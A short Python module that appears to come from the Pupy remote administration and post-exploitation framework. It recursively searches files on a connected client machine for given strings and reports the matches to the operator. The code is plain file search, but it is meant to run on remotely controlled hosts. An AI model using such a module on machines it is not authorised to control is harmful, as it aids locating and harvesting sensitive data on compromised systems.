# -*- coding: UTF8 -*-
from pupylib.PupyModule import *

__class_name__="SearchModule"

class SearchModule(PupyModule):
	""" walk through a directory and recursively search a string into files """

	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog="search", description=self.__doc__)
		self.arg_parser.add_argument('path', help='path')
		self.arg_parser.add_argument('strings', nargs='+',metavar='string',  help='strings to search')

	def run(self, args):
		self.client.load_package("pupyutils.search")
		self.info("searching strings %s in %s ..."%(args.strings, args.path))
		for res in self.client.conn.modules['pupyutils.search'].search_path(args.path, args.strings):
			self.success("%s:%s > %s"%(res[0],res[1],res[2]))
		self.info("search finished !")

